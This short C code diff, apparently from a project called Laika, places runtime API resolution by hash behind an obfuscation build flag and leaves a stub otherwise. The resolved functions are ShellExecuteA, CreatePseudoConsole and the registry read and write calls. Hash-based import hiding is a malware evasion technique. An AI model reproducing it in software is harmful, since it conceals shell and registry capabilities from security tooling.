@@ -137,6 +137,7 @@ _findByHashFail:
 
 /* ======================================[[ Exposed API ]]====================================== */
 
+#ifdef LAIKA_OBFUSCATE
 _ShellExecuteA oShellExecuteA;
 _CreatePseudoConsole oCreatePseudoConsole;
 _ClosePseudoConsole oClosePseudoConsole;
@@ -164,3 +165,9 @@ void laikaO_init()
     oRegSetValueExA = (_RegSetValueExA)(findByHash("advapi32.dll", 0xcb91dcf7));
     oRegQueryValueExA = (_RegQueryValueExA)(findByHash("advapi32.dll", 0x4298d735));
 }
+#else
+void laikaO_init()
+{
+    /* stubbed!! */
+}
+#endif
